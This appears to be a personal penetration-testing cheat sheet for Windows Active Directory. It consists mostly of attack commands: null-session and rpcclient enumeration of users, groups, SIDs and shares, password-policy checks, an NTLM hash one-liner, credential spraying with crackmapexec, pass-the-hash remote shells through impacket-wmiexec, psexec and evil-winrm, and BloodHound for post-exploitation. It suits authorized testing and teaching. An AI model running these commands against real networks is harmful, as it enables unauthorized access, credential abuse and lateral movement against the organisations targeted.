https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/privilege-escalation-abusing-tokens

# Domain username convention
firstlast
flast
firlas
first.last
f.last
fir.las

`python -c 'import hashlib,binascii; print binascii.hexlify(hashlib.new("md4", "<password>".encode("utf-16le")).digest())'`


# Password Policy
`polenum 'USERNAME':'PASSWORD'@IP`
`crackmapexec smb IP -u '' -p '' --pass-pol`


# Password Bruteforce


# Info
`Enum4linux <IP> 2>/dev/null`
`rpcclient -U 'USERNAME' -N <IP>`
`rpcclient -U 'USERNAME'%'PASSWORD' <IP>`
Domainname & info & SID
        	lsaquery
        	querydominfo
	OS information
		srvinfo
	Password Policy
        	getdompwinfo
	Printer info
      		enumprinters
	Users & get SID & SID lookup
	       	enumdomusers			(domain users & RIDs)
	       	querydispinfo			    (accounts & RIDs)
	       	queryuser RID			   (info domain user)
	Groups
	       	enumdomgroups		       (domain groups & RIDs)
	       	querygroup RID			  (info domain group)
	       	querygroupmem RID	     (user RID in group)
	       	enumalsgroups builtin	      (builtin groups)
      		enumalsgroups domain	   (local groups)
	SID
      		lsaenumsid			     (LSA SIDs)
	       	lookupnames USERNAMES   (SID lookup)
	       	lookupsids SID			    (name lookup)
	Shares
	       	netshareenumall
	       	netsharegetinfo


# Expoitation
### Check
`crackmapexec SERVICE IP -u "USER" -p PASS`
`crackmapexec SERVICE IP -u "USER" -H HASH`

### Shell
`impacket-wmiexec -hashes 'HASH' USER@IP`
`impacket-psexec -hashes 'HASH' USER@IP`
`evil-winrm -i IP -u USER -H "HASH"`
`evil-winrm -i IP -u USER -p "PASS"`

# Post-exploitation
`Bloodhound`
`SharpHound`